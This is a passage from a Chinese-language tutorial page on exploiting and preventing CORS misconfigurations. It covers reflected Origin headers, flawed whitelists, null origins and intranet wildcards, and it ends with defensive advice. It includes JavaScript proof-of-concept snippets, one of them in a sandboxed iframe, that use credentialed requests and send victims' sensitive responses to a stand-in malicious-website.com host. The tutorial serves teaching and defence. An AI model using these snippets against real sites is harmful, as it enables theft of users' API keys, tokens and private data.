Origin</h3><p>有些应用程序需要允许很多其它域的访问。维护一个允许域的列表需要付出持续的努力，任何差错都有可能造成破坏。因此，应用程序可能使用一些更加简单的方法来达到最终目的。</p><p>一种方法是从请求头中读取 <code>Origin</code>，然后将其作为 <code>Access-Control-Allow-Origin</code> 响应头返回。例如，应用程序接受了以下请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /sensitive-victim-data HTTP/1.1
+</span></span><span class=line><span class=cl>Host: vulnerable-website.com
+</span></span><span class=line><span class=cl>Origin: https://malicious-website.com
+</span></span><span class=line><span class=cl>Cookie: sessionid=...
+</span></span></code></pre></td></tr></table></div></div><p>然后，其响应：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>Access-Control-Allow-Origin: https://malicious-website.com
+</span></span><span class=line><span class=cl>Access-Control-Allow-Credentials: true
+</span></span></code></pre></td></tr></table></div></div><p>响应头表明允许从请求域进行访问，并且跨域请求可以包括 cookies（<code>Access-Control-Allow-Credentials: true</code>），因此浏览器将会在会话中进行处理。</p><p>由于应用程序在 <code>Access-Control-Allow-Origin</code> 头中直接返回了请求域，这意味着任何域都可以访问资源。如果响应中包含了任何敏感信息，如 API key 或者 CSRF token 则都可以被获取，你可以在你的网站上放置以下脚本进行检索：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>var req = new XMLHttpRequest();
+</span></span><span class=line><span class=cl>req.onload = reqListener;
+</span></span><span class=line><span class=cl>req.open(&#39;get&#39;,&#39;https://vulnerable-website.com/sensitive-victim-data&#39;,true);
+</span></span><span class=line><span class=cl>req.withCredentials = true;
+</span></span><span class=line><span class=cl>req.send();
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>function reqListener() {
+</span></span><span class=line><span class=cl>location=&#39;//malicious-website.com/log?key=&#39;+this.responseText;
+</span></span><span class=line><span class=cl>};
+</span></span></code></pre></td></tr></table></div></div><h3 id=origin-处理漏洞>Origin 处理漏洞</h3><p>某些应用程序使用白名单机制来实现可信来源的访问允许。当收到 CORS 请求时，将请求头中的 origin 与白名单进行比较，如果在白名单中，则在 <code>Access-Control-Allow-Origin</code> 头中返回请求的 origin 以允许其跨域访问。例如，应用程序收到了如下的请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /data HTTP/1.1
+</span></span><span class=line><span class=cl>Host: normal-website.com
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>Origin: https://innocent-website.com
+</span></span></code></pre></td></tr></table></div></div><p>应用程序检查白名单列表，如果 origin 在表中，则响应：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>Access-Control-Allow-Origin: https://innocent-website.com
+</span></span></code></pre></td></tr></table></div></div><p>在实现 CORS origin 白名单时很可能会犯一些失误。某个组织决定允许从其所有子域（包括尚未存在的未来子域）进行访问。应用程序允许从其他组织的域（包括其子域）进行访问。这些规则通常通过匹配 URL 前缀或后缀，或使用正则表达式来实现。实现中的任何失误都可能导致访问权限被授予意外的外部域。</p><p>例如，假设应用程序允许以下结尾的所有域的访问权限：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>normal-website.com
+</span></span></code></pre></td></tr></table></div></div><p>攻击者则可以通过注册以下域来获得访问权限（结尾匹配）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>hackersnormal-website.com
+</span></span></code></pre></td></tr></table></div></div><p>或者应用程序允许以下开头的所有域的访问权限：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>normal-website.com
+</span></span></code></pre></td></tr></table></div></div><p>攻击者则可以使用以下域获得访问权限（开头匹配）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>normal-website.com.evil-user.net
+</span></span></code></pre></td></tr></table></div></div><h3 id=origin-白名单允许-null-值>Origin 白名单允许 null 值</h3><p>浏览器会在以下情况下发送值为 null 的 Origin 头：</p><ul><li>跨站点重定向</li><li>来自序列化数据的请求</li><li>使用 <code>file:</code> 协议的请求</li><li>沙盒中的跨域请求</li></ul><p>某些应用程序可能会在白名单中允许 null 以方便本地开发。例如，假设应用程序收到了以下跨域请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /sensitive-victim-data
+</span></span><span class=line><span class=cl>Host: vulnerable-website.com
+</span></span><span class=line><span class=cl>Origin: null
+</span></span></code></pre></td></tr></table></div></div><p>服务器响应：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>Access-Control-Allow-Origin: null
+</span></span><span class=line><span class=cl>Access-Control-Allow-Credentials: true
+</span></span></code></pre></td></tr></table></div></div><p>在这种情况下，攻击者可以使用各种技巧生成 Origin 为 null 的请求以通过白名单，从而获得访问权限。例如，可以使用 <code>iframe</code> 沙盒进行跨域请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;iframe sandbox=&#34;allow-scripts allow-top-navigation allow-forms&#34; src=&#34;data:text/html,&lt;script&gt;
+</span></span><span class=line><span class=cl>var req = new XMLHttpRequest();
+</span></span><span class=line><span class=cl>req.onload = reqListener;
+</span></span><span class=line><span class=cl>req.open(&#39;get&#39;,&#39;vulnerable-website.com/sensitive-victim-data&#39;,true);
+</span></span><span class=line><span class=cl>req.withCredentials = true;
+</span></span><span class=line><span class=cl>req.send();
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>function reqListener() {
+</span></span><span class=line><span class=cl>location=&#39;malicious-website.com/log?key=&#39;+this.responseText;
+</span></span><span class=line><span class=cl>};
+</span></span><span class=line><span class=cl>&lt;/script&gt;&#34;&gt;&lt;/iframe&gt;
+</span></span></code></pre></td></tr></table></div></div><h3 id=通过-cors-信任关系利用-xss>通过 CORS 信任关系利用 XSS</h3><p><code>CORS</code> 会在两个域之间建立信任关系，即使 <code>CORS</code> 是正确的配置，但是如果某个受信任的网站存在 XSS 漏洞，那么攻击者就可以利用 XSS 漏洞注入脚本，进而从受信任的网站上获取敏感信息。</p><p>假设请求为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /api/requestApiKey HTTP/1.1
+</span></span><span class=line><span class=cl>Host: vulnerable-website.com
+</span></span><span class=line><span class=cl>Origin: https://subdomain.vulnerable-website.com
+</span></span><span class=line><span class=cl>Cookie: sessionid=...
+</span></span></code></pre></td></tr></table></div></div><p>如果服务器响应：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
+</span></span><span class=line><span class=cl>Access-Control-Allow-Credentials: true
+</span></span></code></pre></td></tr></table></div></div><p>那么攻击者可以通过 <code>subdomain.vulnerable-website.com</code> 网站上的 XSS 漏洞去获取一些敏感数据：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://subdomain.vulnerable-website.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;
+</span></span></code></pre></td></tr></table></div></div><h3 id=使用配置有问题的-cors-中断-tls>使用配置有问题的 CORS 中断 TLS</h3><p>假设一个严格使用 HTTPS 的应用程序也通过白名单信任了一个使用 HTTP 的子域。例如，当应用程序收到以下请求时：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /api/requestApiKey HTTP/1.1
+</span></span><span class=line><span class=cl>Host: vulnerable-website.com
+</span></span><span class=line><span class=cl>Origin: http://trusted-subdomain.vulnerable-website.com
+</span></span><span class=line><span class=cl>Cookie: sessionid=...
+</span></span></code></pre></td></tr></table></div></div><p>应用程序响应：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
+</span></span><span class=line><span class=cl>Access-Control-Allow-Credentials: true
+</span></span></code></pre></td></tr></table></div></div><p>在这种情况下，能够拦截受害者用户流量的攻击者可以利用 CORS 来破坏受害者与应用程序的正常交互。攻击步骤如下：</p><ul><li>受害者用户发出任何纯 HTTP 请求。</li><li>攻击者将重定向注入到：<code>http://trusted-subdomain.vulnerable-website.com</code></li><li>受害者的浏览器遵循重定向。</li><li>攻击者截获纯 HTTP 请求，返回伪造的响应给受害者，并发出恶意的 CORS 请求给：<code>https://vulnerable-website.com</code></li><li>受害者的浏览器发出 CORS 请求，origin 为：<code>http://trusted-subdomain.vulnerable-website.com</code></li><li>应用程序允许请求，因为这是一个白名单域，请求的敏感数据在响应中返回。</li><li>攻击者的欺骗页面可以读取敏感数据并将其传输到攻击者控制下的任何域。</li></ul><p>即使易受攻击的网站对 HTTPS 的使用没有漏洞，并且没有 HTTP 端点，同时所有 Cookie 都标记为安全，此攻击也是有效的。</p><h3 id=内网和无凭证的-cors>内网和无凭证的 CORS</h3><p>大部分 <code>CORS</code> 攻击都需要以下响应头的存在：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Access-Control-Allow-Credentials: true
+</span></span></code></pre></td></tr></table></div></div><p>没有这个响应头，受害者的浏览器将不会发送 cookies ，这意味着攻击者只能访问无需用户验证的内容，而这些内容直接访问目标网站就可以轻松获得。</p><p>然而，有一种情况下攻击者无法直接访问网站：网站是内网，并且是私有 IP 地址空间。内网的安全标准通常低于外网，这使得攻击者发现漏洞后可以获得进一步的访问权限。例如，某个私有网络中的跨域请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /reader?url=doc1.pdf
+</span></span><span class=line><span class=cl>Host: intranet.normal-website.com
+</span></span><span class=line><span class=cl>Origin: https://normal-website.com
+</span></span></code></pre></td></tr></table></div></div><p>服务器响应：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>Access-Control-Allow-Origin: *
+</span></span></code></pre></td></tr></table></div></div><p>服务器信任所有来源的跨域请求，而且无需凭证。如果私有IP地址空间内的用户访问公共互联网，则可以从外部站点执行基于 CORS 的攻击，该站点使用受害者的浏览器作为访问内网资源的代理。</p><h2 id=如何防护基于-cors-的攻击>如何防护基于 CORS 的攻击</h2><p><code>CORS</code> 漏洞主要是由于错误的配置而产生的，因此防护措施主要也是如何进行正确配置的问题。下面将会描述一些有效的方法。</p><h3 id=跨域请求的正确配置>跨域请求的正确配置</h3><p>如果 web 资源包含敏感信息，那么应该在 <code>Access-Control-Allow-Origin</code> 头中声明允许的来源。</p><h3 id=只允许受信任的站点>只允许受信任的站点</h3><p><code>Access-Control-Allow-Origin</code> 头只能是受信任的站点。<code>Access-Control-Allow-Origin</code> 直接使用跨域请求的 origin 而不验证是很容易被利用的，应该避免。</p><h3 id=白名单中避免-null>白名单中避免 null</h3><p>避免 <code>Access-Control-Allow-Origin: null</code> 。来自内部文档和沙盒请求的跨域资源调用可以指定 origin 为 null 的。CORS 头应该根据私有和公共服务器的可信来源正确定义。</p><h3 id=避免在内部网络中使用通配符>避免在内部网络中使用通配符</h3><p>避免在内部网络中使用通配符。当内部浏览器可以访问不受信任的外部域时，仅仅依靠网络配置来保护内部资源是不够的。</p><h3 id=cors-不是服务端安全策略的替代品>CORS 不是服务端安全策略的替代品</h3><p><code>CORS</code> 定义的只是浏览器行为，永远不能替代服务端对敏感数据的保护，毕竟攻击者可以直接在其它环境中伪造来自任何 origin 的请求。因此，除了正确配置的 CORS 之外，web 服务端仍然需要使用诸如身份验证和会话管理等措施对敏感数据进行保护。</p></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>凌虚</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/contrib/auto-render.min.js></script><script type=text/javascript src=/lib/katex/contrib/copy-tex.min.js></script><script type=text/javascript src=/lib/katex/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:50,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
